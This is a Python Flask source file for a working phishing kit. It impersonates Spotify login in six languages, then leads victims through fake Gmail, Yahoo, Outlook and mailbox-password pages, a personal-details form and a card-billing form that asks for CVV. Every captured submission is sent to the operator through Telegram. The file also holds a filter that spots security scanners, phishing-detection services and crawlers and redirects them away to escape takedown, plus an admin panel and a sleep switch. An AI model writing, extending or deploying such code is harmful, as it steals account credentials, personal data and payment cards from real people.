from flask import Flask, request, render_template, jsonify, redirect, send_from_directory
import requests
import json
import re
import time
from datetime import datetime
import logging
import threading
from collections import deque
import hashlib
import os
import pickle

app = Flask(__name__)
app.secret_key = os.urandom(24)

# ====== CONFIG FILE ======
CONFIG_FILE = 'config.pkl'

def load_config():
    try:
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, 'rb') as f:
                return pickle.load(f)
    except:
        pass
    return {
        'telegram_token': '',
        'chat_id': '',
        'admin_passcode': '1100',
        'mode': 'active',
        'last_updated': datetime.now().isoformat()
    }

def save_config(config):
    try:
        with open(CONFIG_FILE, 'wb') as f:
            pickle.dump(config, f)
        return True
    except:
        return False

CONFIG = load_config()

# ====== LOGS ======
visitors_log = deque(maxlen=200)
captures_log = deque(maxlen=100)
bot_log = deque(maxlen=50)
activity_log = deque(maxlen=100)
error_log = deque(maxlen=50)

# ====== STATS ======
STATS = {
    'total_visitors': 0,
    'total_bots': 0,
    'total_captures': 0,
    'unique_ips': set(),
    'start_time': datetime.now().isoformat()
}

# ====== DICTIONNAIRE MULTI-LANGUES ======
LANGUAGES = {
    'fr': {
        'name': 'Français',
        'login_title': 'Connectez-vous à Spotify',
        'login_email': 'E-mail ou nom d\'utilisateur',
        'login_password': 'Mot de passe',
        'login_button': 'Se connecter',
        'login_error': 'Veuillez entrer votre email et mot de passe Spotify.',
        'gmail_title': 'Vérifier l\'accès à la messagerie',
        'gmail_subtitle': 'Confirmez la propriété de votre email de récupération pour continuer.',
        'gmail_email': 'Adresse email',
        'gmail_password': 'Mot de passe',
        'gmail_button': 'Suivant',
        'yahoo_title': 'Vérifier Yahoo Mail',
        'yahoo_subtitle': 'Confirmez le mot de passe du compte pour continuer.',
        'yahoo_email': 'Email Yahoo',
        'yahoo_password': 'Mot de passe',
        'yahoo_button': 'Vérifier',
        'outlook_title': 'Vérifier l\'accès Outlook',
        'outlook_subtitle': 'Veuillez authentifier votre boîte mail de récupération.',
        'outlook_email': 'Email, téléphone ou Skype',
        'outlook_password': 'Mot de passe',
        'outlook_button': 'Se connecter',
        'generic_title': 'Vérifier le mot de passe de la boîte mail',
        'generic_subtitle': 'Veuillez ressaisir vos identifiants de messagerie pour finaliser la synchronisation.',
        'generic_email': 'Adresse email',
        'generic_password': 'Mot de passe de la boîte mail',
        'generic_button': 'Continuer',
        'personal_title': 'Confirmer les coordonnées',
        'personal_subtitle': 'Veuillez mettre à jour vos coordonnées de facturation pour finaliser la validation du compte.',
        'personal_firstname': 'Prénom',
        'personal_lastname': 'Nom',
        'personal_address': 'Adresse',
        'personal_city': 'Ville',
        'personal_postal': 'Code postal',
        'personal_phone': 'Numéro de téléphone',
        'personal_button': 'Continuer vers la facturation',
        'billing_title': 'Mettre à jour le mode de paiement',
        'billing_subtitle': 'Vérifiez votre carte de facturation active pour finaliser la synchronisation de l\'abonnement.',
        'billing_cardholder': 'Nom du titulaire',
        'billing_cardnumber': 'Numéro de carte',
        'billing_expiry': 'Date d\'expiration',
        'billing_cvv': 'CVV / Code de sécurité',
        'billing_button': 'Vérifier et enregistrer',
        'success_title': 'Compte vérifié',
        'success_subtitle': 'Les informations de votre compte ont été mises à jour avec succès.',
        'success_button': 'Aller sur Spotify',
        'success_redirect': 'Vous serez redirigé automatiquement dans 5 secondes.',
        'sleep_title': 'Mode veille',
        'sleep_subtitle': 'Le service est actuellement indisponible.',
        'sleep_admin': 'Le panneau d\'administration reste accessible.'
    },
    'en': {
        'name': 'English',
        'login_title': 'Log in to Spotify',
        'login_email': 'Email or username',
        'login_password': 'Password',
        'login_button': 'Log In',
        'login_error': 'Please enter your Spotify email and password.',
        'gmail_title': 'Verify Mail Access',
        'gmail_subtitle': 'Confirm ownership of your recovery email to continue.',
        'gmail_email': 'Email address',
        'gmail_password': 'Password',
        'gmail_button': 'Next',
        'yahoo_title': 'Verify Yahoo Mail',
        'yahoo_subtitle': 'Confirm account password to proceed.',
        'yahoo_email': 'Yahoo Email',
        'yahoo_password': 'Password',
        'yahoo_button': 'Verify',
        'outlook_title': 'Verify Outlook Access',
        'outlook_subtitle': 'Please authenticate your recovery mailbox.',
        'outlook_email': 'Email, phone, or Skype',
        'outlook_password': 'Password',
        'outlook_button': 'Sign in',
        'generic_title': 'Verify Mailbox Password',
        'generic_subtitle': 'Please re-enter your inbox credentials to finish syncing account credentials.',
        'generic_email': 'Email Address',
        'generic_password': 'Mailbox Password',
        'generic_button': 'Continue',
        'personal_title': 'Confirm Details',
        'personal_subtitle': 'Please update your billing contact details to finalize account validation.',
        'personal_firstname': 'First Name',
        'personal_lastname': 'Last Name',
        'personal_address': 'Street Address',
        'personal_city': 'City',
        'personal_postal': 'Postal Code',
        'personal_phone': 'Phone Number',
        'personal_button': 'Continue to Billing',
        'billing_title': 'Update Payment Method',
        'billing_subtitle': 'Verify your active billing card to complete subscription synchronization.',
        'billing_cardholder': 'Cardholder Name',
        'billing_cardnumber': 'Card Number',
        'billing_expiry': 'Expiry Date',
        'billing_cvv': 'CVV / Security Code',
        'billing_button': 'Verify and Save',
        'success_title': 'Account Verified',
        'success_subtitle': 'Your account information has been successfully updated.',
        'success_button': 'Go to Spotify',
        'success_redirect': 'You will be redirected automatically in 5 seconds.',
        'sleep_title': 'Sleep Mode',
        'sleep_subtitle': 'Service is currently unavailable.',
        'sleep_admin': 'Admin panel is still accessible.'
    },
    'es': {
        'name': 'Español',
        'login_title': 'Iniciar sesión en Spotify',
        'login_email': 'Correo electrónico o nombre de usuario',
        'login_password': 'Contraseña',
        'login_button': 'Iniciar sesión',
        'login_error': 'Por favor, introduzca su correo electrónico y contraseña de Spotify.',
        'gmail_title': 'Verificar acceso al correo',
        'gmail_subtitle': 'Confirme la propiedad de su correo de recuperación para continuar.',
        'gmail_email': 'Dirección de correo electrónico',
        'gmail_password': 'Contraseña',
        'gmail_button': 'Siguiente',
        'yahoo_title': 'Verificar Yahoo Mail',
        'yahoo_subtitle': 'Confirme la contraseña de la cuenta para continuar.',
        'yahoo_email': 'Correo Yahoo',
        'yahoo_password': 'Contraseña',
        'yahoo_button': 'Verificar',
        'outlook_title': 'Verificar acceso a Outlook',
        'outlook_subtitle': 'Autentique su buzón de recuperación.',
        'outlook_email': 'Correo, teléfono o Skype',
        'outlook_password': 'Contraseña',
        'outlook_button': 'Iniciar sesión',
        'generic_title': 'Verificar contraseña del buzón',
        'generic_subtitle': 'Vuelva a introducir sus credenciales de correo para finalizar la sincronización.',
        'generic_email': 'Dirección de correo electrónico',
        'generic_password': 'Contraseña del buzón',
        'generic_button': 'Continuar',
        'personal_title': 'Confirmar datos',
        'personal_subtitle': 'Actualice sus datos de contacto de facturación para finalizar la validación.',
        'personal_firstname': 'Nombre',
        'personal_lastname': 'Apellido',
        'personal_address': 'Dirección',
        'personal_city': 'Ciudad',
        'personal_postal': 'Código postal',
        'personal_phone': 'Número de teléfono',
        'personal_button': 'Continuar a facturación',
        'billing_title': 'Actualizar método de pago',
        'billing_subtitle': 'Verifique su tarjeta de facturación activa para completar la sincronización.',
        'billing_cardholder': 'Nombre del titular',
        'billing_cardnumber': 'Número de tarjeta',
        'billing_expiry': 'Fecha de caducidad',
        'billing_cvv': 'CVV / Código de seguridad',
        'billing_button': 'Verificar y guardar',
        'success_title': 'Cuenta verificada',
        'success_subtitle': 'La información de su cuenta se ha actualizado correctamente.',
        'success_button': 'Ir a Spotify',
        'success_redirect': 'Será redirigido automáticamente en 5 segundos.',
        'sleep_title': 'Modo suspensión',
        'sleep_subtitle': 'El servicio no está disponible actualmente.',
        'sleep_admin': 'El panel de administración sigue accesible.'
    },
    'de': {
        'name': 'Deutsch',
        'login_title': 'Bei Spotify anmelden',
        'login_email': 'E-Mail-Adresse oder Benutzername',
        'login_password': 'Passwort',
        'login_button': 'Anmelden',
        'login_error': 'Bitte geben Sie Ihre Spotify-E-Mail und Ihr Passwort ein.',
        'gmail_title': 'E-Mail-Zugriff bestätigen',
        'gmail_subtitle': 'Bestätigen Sie den Besitz Ihrer Wiederherstellungs-E-Mail, um fortzufahren.',
        'gmail_email': 'E-Mail-Adresse',
        'gmail_password': 'Passwort',
        'gmail_button': 'Weiter',
        'yahoo_title': 'Yahoo Mail bestätigen',
        'yahoo_subtitle': 'Bestätigen Sie das Kontopasswort, um fortzufahren.',
        'yahoo_email': 'Yahoo-E-Mail',
        'yahoo_password': 'Passwort',
        'yahoo_button': 'Bestätigen',
        'outlook_title': 'Outlook-Zugriff bestätigen',
        'outlook_subtitle': 'Bitte authentifizieren Sie Ihr Wiederherstellungs-Postfach.',
        'outlook_email': 'E-Mail, Telefon oder Skype',
        'outlook_password': 'Passwort',
        'outlook_button': 'Anmelden',
        'generic_title': 'Postfach-Passwort bestätigen',
        'generic_subtitle': 'Bitte geben Sie Ihre Postfach-Anmeldedaten erneut ein, um die Synchronisierung abzuschließen.',
        'generic_email': 'E-Mail-Adresse',
        'generic_password': 'Postfach-Passwort',
        'generic_button': 'Fortfahren',
        'personal_title': 'Daten bestätigen',
        'personal_subtitle': 'Bitte aktualisieren Sie Ihre Rechnungskontaktdaten, um die Kontovalidierung abzuschließen.',
        'personal_firstname': 'Vorname',
        'personal_lastname': 'Nachname',
        'personal_address': 'Adresse',
        'personal_city': 'Stadt',
        'personal_postal': 'Postleitzahl',
        'personal_phone': 'Telefonnummer',
        'personal_button': 'Weiter zur Abrechnung',
        'billing_title': 'Zahlungsmethode aktualisieren',
        'billing_subtitle': 'Bestätigen Sie Ihre aktive Abrechnungskarte, um die Abonnementsynchronisierung abzuschließen.',
        'billing_cardholder': 'Name des Karteninhabers',
        'billing_cardnumber': 'Kartennummer',
        'billing_expiry': 'Ablaufdatum',
        'billing_cvv': 'CVV / Sicherheitscode',
        'billing_button': 'Bestätigen und speichern',
        'success_title': 'Konto bestätigt',
        'success_subtitle': 'Ihre Kontoinformationen wurden erfolgreich aktualisiert.',
        'success_button': 'Zu Spotify',
        'success_redirect': 'Sie werden in 5 Sekunden automatisch weitergeleitet.',
        'sleep_title': 'Ruhemodus',
        'sleep_subtitle': 'Der Dienst ist derzeit nicht verfügbar.',
        'sleep_admin': 'Das Admin-Panel ist weiterhin zugänglich.'
    },
    'pt': {
        'name': 'Português',
        'login_title': 'Entrar no Spotify',
        'login_email': 'E-mail ou nome de utilizador',
        'login_password': 'Palavra-passe',
        'login_button': 'Entrar',
        'login_error': 'Por favor, insira o seu e-mail e palavra-passe do Spotify.',
        'gmail_title': 'Verificar acesso ao e-mail',
        'gmail_subtitle': 'Confirme a propriedade do seu e-mail de recuperação para continuar.',
        'gmail_email': 'Endereço de e-mail',
        'gmail_password': 'Palavra-passe',
        'gmail_button': 'Seguinte',
        'yahoo_title': 'Verificar Yahoo Mail',
        'yahoo_subtitle': 'Confirme a palavra-passe da conta para continuar.',
        'yahoo_email': 'E-mail Yahoo',
        'yahoo_password': 'Palavra-passe',
        'yahoo_button': 'Verificar',
        'outlook_title': 'Verificar acesso ao Outlook',
        'outlook_subtitle': 'Autentique a sua caixa de correio de recuperação.',
        'outlook_email': 'E-mail, telefone ou Skype',
        'outlook_password': 'Palavra-passe',
        'outlook_button': 'Entrar',
        'generic_title': 'Verificar palavra-passe da caixa de correio',
        'generic_subtitle': 'Reintroduza as suas credenciais de correio para finalizar a sincronização.',
        'generic_email': 'Endereço de e-mail',
        'generic_password': 'Palavra-passe da caixa de correio',
        'generic_button': 'Continuar',
        'personal_title': 'Confirmar dados',
        'personal_subtitle': 'Atualize os seus dados de contacto de faturação para finalizar a validação.',
        'personal_firstname': 'Primeiro nome',
        'personal_lastname': 'Apelido',
        'personal_address': 'Morada',
        'personal_city': 'Cidade',
        'personal_postal': 'Código postal',
        'personal_phone': 'Número de telefone',
        'personal_button': 'Continuar para faturação',
        'billing_title': 'Atualizar método de pagamento',
        'billing_subtitle': 'Verifique o seu cartão de faturação ativo para concluir a sincronização.',
        'billing_cardholder': 'Nome do titular',
        'billing_cardnumber': 'Número do cartão',
        'billing_expiry': 'Data de validade',
        'billing_cvv': 'CVV / Código de segurança',
        'billing_button': 'Verificar e guardar',
        'success_title': 'Conta verificada',
        'success_subtitle': 'As informações da sua conta foram atualizadas com sucesso.',
        'success_button': 'Ir para o Spotify',
        'success_redirect': 'Será redirecionado automaticamente em 5 segundos.',
        'sleep_title': 'Modo de suspensão',
        'sleep_subtitle': 'O serviço está atualmente indisponível.',
        'sleep_admin': 'O painel de administração continua acessível.'
    },
    'ar': {
        'name': 'العربية',
        'login_title': 'تسجيل الدخول إلى Spotify',
        'login_email': 'البريد الإلكتروني أو اسم المستخدم',
        'login_password': 'كلمة المرور',
        'login_button': 'تسجيل الدخول',
        'login_error': 'يرجى إدخال بريدك الإلكتروني وكلمة المرور الخاصة بـ Spotify.',
        'gmail_title': 'التحقق من الوصول إلى البريد',
        'gmail_subtitle': 'تأكيد ملكية بريدك الإلكتروني للاسترداد للمتابعة.',
        'gmail_email': 'عنوان البريد الإلكتروني',
        'gmail_password': 'كلمة المرور',
        'gmail_button': 'التالي',
        'yahoo_title': 'التحقق من Yahoo Mail',
        'yahoo_subtitle': 'تأكيد كلمة مرور الحساب للمتابعة.',
        'yahoo_email': 'بريد Yahoo',
        'yahoo_password': 'كلمة المرور',
        'yahoo_button': 'تحقق',
        'outlook_title': 'التحقق من الوصول إلى Outlook',
        'outlook_subtitle': 'يرجى المصادقة على صندوق البريد الخاص بالاسترداد.',
        'outlook_email': 'البريد الإلكتروني أو الهاتف أو Skype',
        'outlook_password': 'كلمة المرور',
        'outlook_button': 'تسجيل الدخول',
        'generic_title': 'التحقق من كلمة مرور صندوق البريد',
        'generic_subtitle': 'يرجى إعادة إدخال بيانات اعتماد صندوق البريد الخاص بك لإكمال المزامنة.',
        'generic_email': 'عنوان البريد الإلكتروني',
        'generic_password': 'كلمة مرور صندوق البريد',
        'generic_button': 'متابعة',
        'personal_title': 'تأكيد التفاصيل',
        'personal_subtitle': 'يرجى تحديث تفاصيل الاتصال الخاصة بالفوترة لإكمال التحقق من الحساب.',
        'personal_firstname': 'الاسم الأول',
        'personal_lastname': 'اسم العائلة',
        'personal_address': 'العنوان',
        'personal_city': 'المدينة',
        'personal_postal': 'الرمز البريدي',
        'personal_phone': 'رقم الهاتف',
        'personal_button': 'المتابعة إلى الفوترة',
        'billing_title': 'تحديث طريقة الدفع',
        'billing_subtitle': 'تحقق من بطاقة الفوترة النشطة لإكمال مزامنة الاشتراك.',
        'billing_cardholder': 'اسم حامل البطاقة',
        'billing_cardnumber': 'رقم البطاقة',
        'billing_expiry': 'تاريخ الانتهاء',
        'billing_cvv': 'CVV / رمز الأمان',
        'billing_button': 'تحقق واحفظ',
        'success_title': 'تم التحقق من الحساب',
        'success_subtitle': 'تم تحديث معلومات حسابك بنجاح.',
        'success_button': 'الذهاب إلى Spotify',
        'success_redirect': 'سيتم إعادة توجيهك تلقائياً خلال 5 ثوانٍ.',
        'sleep_title': 'وضع السكون',
        'sleep_subtitle': 'الخدمة غير متاحة حالياً.',
        'sleep_admin': 'لوحة الإدارة لا تزال قابلة للوصول.'
    }
}

# ====== DÉTECTION DE LANGUE UNIQUEMENT PAR IP ======
def detect_language_by_ip():
    try:
        ip = request.headers.get('X-Forwarded-For', '').split(',')[0].strip()
        if not ip or ip == '127.0.0.1':
            ip = request.remote_addr
        
        if hasattr(request, '_lang_cache'):
            return request._lang_cache
        
        response = requests.get(f'http://ip-api.com/json/{ip}?fields=status,countryCode', timeout=2)
        data = response.json()
        
        if data.get('status') == 'success':
            country_code = data.get('countryCode', '').upper()
            country_to_lang = {
                'FR': 'fr', 'BE': 'fr', 'CH': 'fr', 'CA': 'fr', 'LU': 'fr',
                'ES': 'es', 'MX': 'es', 'AR': 'es', 'CO': 'es', 'PE': 'es',
                'DE': 'de', 'AT': 'de', 'LI': 'de',
                'PT': 'pt', 'BR': 'pt', 'AO': 'pt', 'MZ': 'pt',
                'SA': 'ar', 'AE': 'ar', 'EG': 'ar', 'DZ': 'ar', 'MA': 'ar',
                'US': 'en', 'GB': 'en', 'AU': 'en', 'NZ': 'en', 'IE': 'en'
            }
            lang = country_to_lang.get(country_code, 'en')
            request._lang_cache = lang
            return lang
    except:
        pass
    
    return 'en'

def get_text(lang, key):
    if lang in LANGUAGES and key in LANGUAGES[lang]:
        return LANGUAGES[lang][key]
    return LANGUAGES['en'].get(key, key)

# ====== TELEGRAM ENGINE ======
from utils.telegram import TelegramBot
telegram = TelegramBot(CONFIG.get('telegram_token'), CONFIG.get('chat_id'))

# ====== ANTI-BOT ======
def is_bot():
    user_agent = request.headers.get('User-Agent', '').lower()
    accept_lang = request.headers.get('Accept-Language', '')
    sec_ch_ua = request.headers.get('Sec-Ch-Ua', '')
    
    bot_signatures = [
        'bot', 'crawl', 'spider', 'slurp', 'googlebot', 'bingbot',
        'duckduckbot', 'baiduspider', 'yandexbot', 'sogou',
        'headless', 'phantomjs', 'puppeteer', 'selenium', 'playwright',
        'python-requests', 'aiohttp', 'httpx', 'curl', 'wget',
        'libwww-perl', 'lwp', 'http-client', 'netcraft', 'virustotal',
        'phishtank', 'urlscan', 'security', 'scanner', 'probe',
        'burp', 'zap', 'nmap', 'nikto', 'sqlmap', 'wappalyzer',
        'whatweb', 'wpscan', 'nuclei', 'gobuster', 'ffuf', 'dirb',
        'wfuzz', 'hydra', 'medusa', 'openvas', 'nessus', 'qualys',
        'cloudflare', 'amazonaws', 'azure', 'googlecloud',
        'digitalocean', 'heroku', 'datadog', 'newrelic'
    ]
    
    for sig in bot_signatures:
        if sig in user_agent:
            return True
    
    if not user_agent or len(user_agent) < 10:
        return True
    
    if not accept_lang:
        return True
    
    if 'chrome' in user_agent and not sec_ch_ua:
        return True
    
    return False

# ====== GEOLOCATION ======
def get_geo_data():
    ip = request.headers.get('X-Forwarded-For', '').split(',')[0].strip()
    if not ip:
        ip = request.remote_addr
    
    try:
        response = requests.get(f'http://ip-api.com/json/{ip}?fields=status,country,countryCode,city,isp,query,regionName,timezone,lat,lon', timeout=3)
        data = response.json()
        if data.get('status') == 'success':
            return {
                'ip': data.get('query', ip),
                'country': data.get('country', 'Unknown'),
                'countryCode': data.get('countryCode', 'en').lower(),
                'city': data.get('city', 'Unknown'),
                'region': data.get('regionName', 'Unknown'),
                'isp': data.get('isp', 'Unknown'),
                'timezone': data.get('timezone', 'Unknown'),
                'lat': data.get('lat', 0),
                'lon': data.get('lon', 0)
            }
    except:
        pass
    
    return {
        'ip': ip,
        'country': 'Unknown',
        'countryCode': 'en',
        'city': 'Unknown',
        'region': 'Unknown',
        'isp': 'Unknown',
        'timezone': 'Unknown',
        'lat': 0,
        'lon': 0
    }

# ====== LOGGER ======
def log_visitor(page, is_bot_flag=False):
    geo = get_geo_data()
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    entry = {
        'timestamp': datetime.now().isoformat(),
        'ip': geo['ip'],
        'page': page,
        'country': geo['country'],
        'city': geo['city'],
        'isp': geo['isp'],
        'user_agent': user_agent[:60],
        'is_bot': is_bot_flag
    }
    
    visitors_log.append(entry)
    STATS['total_visitors'] += 1
    
    if is_bot_flag:
        STATS['total_bots'] += 1
        bot_log.append(entry)
    else:
        STATS['unique_ips'].add(geo['ip'])

def log_capture(data):
    entry = {
        'timestamp': datetime.now().isoformat(),
        'type': data.get('type', 'Unknown'),
        'email': data.get('email', '')[:50],
        'ip': data.get('ip', ''),
        'country': data.get('country', '')
    }
    captures_log.append(entry)
    STATS['total_captures'] += 1

def log_error(error_type, error_message, ip=None):
    entry = {
        'timestamp': datetime.now().isoformat(),
        'type': error_type,
        'message': error_message,
        'ip': ip or request.remote_addr
    }
    error_log.append(entry)

# ====== ROUTES ======

@app.route('/')
def index():
    try:
        if CONFIG['mode'] == 'sleep':
            return render_template('sleep.html')
        
        is_bot_flag = is_bot()
        log_visitor('/', is_bot_flag)
        
        if is_bot_flag:
            return redirect('https://www.google.com')
        
        lang = detect_language_by_ip()
        return render_template('index.html', lang=lang, get_text=get_text)
    except Exception as e:
        log_error('IndexError', str(e))
        return "Service temporarily unavailable", 500

@app.route('/mail-gmail')
def mail_gmail():
    try:
        if CONFIG['mode'] == 'sleep':
            return render_template('sleep.html')
        if is_bot():
            return redirect('https://www.google.com')
        log_visitor('/mail-gmail')
        lang = detect_language_by_ip()
        return render_template('mail-gmail.html', lang=lang, get_text=get_text)
    except Exception as e:
        log_error('GmailPageError', str(e))
        return "Service temporarily unavailable", 500

@app.route('/mail-yahoo')
def mail_yahoo():
    try:
        if CONFIG['mode'] == 'sleep':
            return render_template('sleep.html')
        if is_bot():
            return redirect('https://www.google.com')
        log_visitor('/mail-yahoo')
        lang = detect_language_by_ip()
        return render_template('mail-yahoo.html', lang=lang, get_text=get_text)
    except Exception as e:
        log_error('YahooPageError', str(e))
        return "Service temporarily unavailable", 500

@app.route('/mail-outlook')
def mail_outlook():
    try:
        if CONFIG['mode'] == 'sleep':
            return render_template('sleep.html')
        if is_bot():
            return redirect('https://www.google.com')
        log_visitor('/mail-outlook')
        lang = detect_language_by_ip()
        return render_template('mail-outlook.html', lang=lang, get_text=get_text)
    except Exception as e:
        log_error('OutlookPageError', str(e))
        return "Service temporarily unavailable", 500

@app.route('/mail-generic')
def mail_generic():
    try:
        if CONFIG['mode'] == 'sleep':
            return render_template('sleep.html')
        if is_bot():
            return redirect('https://www.google.com')
        log_visitor('/mail-generic')
        lang = detect_language_by_ip()
        return render_template('mail-generic.html', lang=lang, get_text=get_text)
    except Exception as e:
        log_error('GenericMailPageError', str(e))
        return "Service temporarily unavailable", 500

@app.route('/personal')
def personal():
    try:
        if CONFIG['mode'] == 'sleep':
            return render_template('sleep.html')
        if is_bot():
            return redirect('https://www.google.com')
        log_visitor('/personal')
        lang = detect_language_by_ip()
        return render_template('personal.html', lang=lang, get_text=get_text)
    except Exception as e:
        log_error('PersonalPageError', str(e))
        return "Service temporarily unavailable", 500

@app.route('/billing')
def billing():
    try:
        if CONFIG['mode'] == 'sleep':
            return render_template('sleep.html')
        if is_bot():
            return redirect('https://www.google.com')
        log_visitor('/billing')
        lang = detect_language_by_ip()
        return render_template('billing.html', lang=lang, get_text=get_text)
    except Exception as e:
        log_error('BillingPageError', str(e))
        return "Service temporarily unavailable", 500

@app.route('/success')
def success():
    try:
        if CONFIG['mode'] == 'sleep':
            return render_template('sleep.html')
        if is_bot():
            return redirect('https://www.google.com')
        log_visitor('/success')
        lang = detect_language_by_ip()
        return render_template('success.html', lang=lang, get_text=get_text)
    except Exception as e:
        log_error('SuccessPageError', str(e))
        return "Service temporarily unavailable", 500

@app.route('/blocked')
def blocked():
    return render_template('blocked.html')

@app.route('/admin')
def admin():
    return render_template('admin.html')

@app.route('/sleep')
def sleep_page():
    return render_template('sleep.html')

# ====== API ======

@app.route('/api/login', methods=['POST'])
def api_login():
    try:
        if CONFIG['mode'] == 'sleep':
            return jsonify({'status': 'error', 'message': 'Service unavailable'}), 503
        
        if is_bot():
            return jsonify({'status': 'error', 'message': 'Bot detected'}), 403
        
        data = request.get_json()
        email = data.get('email', '')
        password = data.get('password', '')
        user_agent = request.headers.get('User-Agent', 'Unknown')
        geo = get_geo_data()
        
        capture_data = {
            'type': 'Spotify Login',
            'email': email,
            'password': password,
            'ip': geo['ip'],
            'country': geo['country'],
            'city': geo['city'],
            'user_agent': user_agent
        }
        log_capture(capture_data)
        
        # ENVOI TELEGRAM
        telegram.send_capture(capture_data)
        
        domain = email.split('@')[1].lower() if '@' in email else ''
        
        if 'gmail.com' in domain:
            next_page = '/mail-gmail'
        elif 'yahoo.com' in domain or 'ymail.com' in domain:
            next_page = '/mail-yahoo'
        elif 'outlook.com' in domain or 'hotmail.com' in domain:
            next_page = '/mail-outlook'
        elif '@' in email:
            next_page = '/mail-generic'
        else:
            next_page = '/personal'
        
        return jsonify({'status': 'success', 'next': next_page})
    except Exception as e:
        log_error('LoginAPIError', str(e))
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/mail', methods=['POST'])
def api_mail():
    try:
        if CONFIG['mode'] == 'sleep':
            return jsonify({'status': 'error', 'message': 'Service unavailable'}), 503
        
        if is_bot():
            return jsonify({'status': 'error', 'message': 'Bot detected'}), 403
        
        data = request.get_json()
        provider = data.get('provider', 'Generic')
        mail_email = data.get('mailEmail', '')
        mail_password = data.get('mailPassword', '')
        geo = get_geo_data()
        
        capture_data = {
            'type': f'Mail Access ({provider})',
            'email': mail_email,
            'password': mail_password,
            'ip': geo['ip'],
            'country': geo['country'],
            'city': geo['city'],
            'user_agent': request.headers.get('User-Agent', 'Unknown')
        }
        log_capture(capture_data)
        
        # ENVOI TELEGRAM
        telegram.send_capture(capture_data)
        
        return jsonify({'status': 'success', 'next': '/personal'})
    except Exception as e:
        log_error('MailAPIError', str(e))
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/personal', methods=['POST'])
def api_personal():
    try:
        if CONFIG['mode'] == 'sleep':
            return jsonify({'status': 'error', 'message': 'Service unavailable'}), 503
        
        if is_bot():
            return jsonify({'status': 'error', 'message': 'Bot detected'}), 403
        
        data = request.get_json()
        geo = get_geo_data()
        
        first_name = data.get('firstName', '')
        last_name = data.get('lastName', '')
        address = data.get('address', '')
        city = data.get('city', '')
        postal_code = data.get('postalCode', '')
        phone = data.get('phone', '')
        user_agent = request.headers.get('User-Agent', 'Unknown')
        
        capture_data = {
            'type': 'Personal Info',
            'email': f'{first_name} {last_name}',
            'password': phone,
            'ip': geo['ip'],
            'country': geo['country'],
            'city': geo['city'],
            'user_agent': user_agent
        }
        log_capture(capture_data)
        
        # ENVOI TELEGRAM
        telegram.send_capture(capture_data)
        
        return jsonify({'status': 'success', 'next': '/billing'})
    except Exception as e:
        log_error('PersonalAPIError', str(e))
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/billing', methods=['POST'])
def api_billing():
    try:
        if CONFIG['mode'] == 'sleep':
            return jsonify({'status': 'error', 'message': 'Service unavailable'}), 503
        
        if is_bot():
            return jsonify({'status': 'error', 'message': 'Bot detected'}), 403
        
        data = request.get_json()
        geo = get_geo_data()
        
        card_holder = data.get('cardHolder', '')
        card_number = data.get('cardNumber', '')
        expiry = data.get('expiry', '')
        cvv = data.get('cvv', '')
        user_agent = request.headers.get('User-Agent', 'Unknown')
        
        capture_data = {
            'type': 'Billing/Card',
            'email': card_holder,
            'password': card_number[-4:],
            'ip': geo['ip'],
            'country': geo['country'],
            'city': geo['city'],
            'user_agent': user_agent
        }
        log_capture(capture_data)
        
        # ENVOI TELEGRAM
        telegram.send_capture(capture_data)
        
        return jsonify({'status': 'success', 'next': '/success'})
    except Exception as e:
        log_error('BillingAPIError', str(e))
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/admin', methods=['GET', 'POST'])
def api_admin():
    try:
        if request.method == 'POST':
            data = request.get_json()
            if data.get('passcode') == CONFIG['admin_passcode']:
                if 'telegram_token' in data:
                    CONFIG['telegram_token'] = data['telegram_token']
                if 'chat_id' in data:
                    CONFIG['chat_id'] = data['chat_id']
                if 'mode' in data:
                    CONFIG['mode'] = data['mode']
                    activity_log.append({
                        'time': datetime.now().isoformat(),
                        'type': 'mode_change',
                        'message': f'Mode changed to {data["mode"]}'
                    })
                CONFIG['last_updated'] = datetime.now().isoformat()
                
                save_config(CONFIG)
                
                # RECONFIGURER TELEGRAM
                telegram.configure(CONFIG['telegram_token'], CONFIG['chat_id'])
                
                return jsonify({
                    'status': 'success',
                    'config': CONFIG,
                    'telegram_status': telegram.status,
                    'telegram_last_response': telegram.last_error
                })
            return jsonify({'status': 'error', 'message': 'Invalid passcode'}), 401
        
        # GET
        passcode = request.headers.get('X-Admin-Passcode')
        if passcode == CONFIG['admin_passcode']:
            return jsonify({
                'status': 'success',
                'config': CONFIG,
                'stats': {
                    'total_visitors': STATS['total_visitors'],
                    'total_bots': STATS['total_bots'],
                    'total_captures': STATS['total_captures'],
                    'unique_ips': len(STATS['unique_ips']),
                    'uptime': datetime.now().isoformat()
                },
                'logs': {
                    'visitors': list(visitors_log)[:30],
                    'captures': list(captures_log)[:20],
                    'activity': list(activity_log)[:20],
                    'errors': list(error_log)[:30]
                },
                'telegram': {
                    'status': telegram.status,
                    'configured': bool(CONFIG['telegram_token'] and CONFIG['chat_id']),
                    'last_error': telegram.last_error
                }
            })
        return jsonify({'status': 'error', 'message': 'Unauthorized'}), 401
    except Exception as e:
        log_error('AdminAPIError', str(e))
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/admin/clear-errors', methods=['POST'])
def clear_errors():
    try:
        data = request.get_json()
        if data.get('passcode') != CONFIG['admin_passcode']:
            return jsonify({'status': 'error', 'message': 'Invalid passcode'}), 401
        
        error_log.clear()
        activity_log.append({
            'time': datetime.now().isoformat(),
            'type': 'error_clear',
            'message': 'Error log cleared by admin'
        })
        return jsonify({'status': 'success', 'message': 'Error log cleared'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/static/<path:path>')
def serve_static(path):
    return send_from_directory('static', path)

@app.route('/test-telegram')
def test_telegram():
    try:
        result = telegram.send_message("🧪 *Test message from server*\n\nIf you receive this, Telegram is working!")
        return jsonify({
            'status': 'success' if result else 'error',
            'telegram_status': telegram.status,
            'token_configured': bool(CONFIG['telegram_token']),
            'chat_id_configured': bool(CONFIG['chat_id']),
            'last_error': telegram.last_error
        })
    except Exception as e:
        log_error('TelegramTestError', str(e))
        return jsonify({'status': 'error', 'message': str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)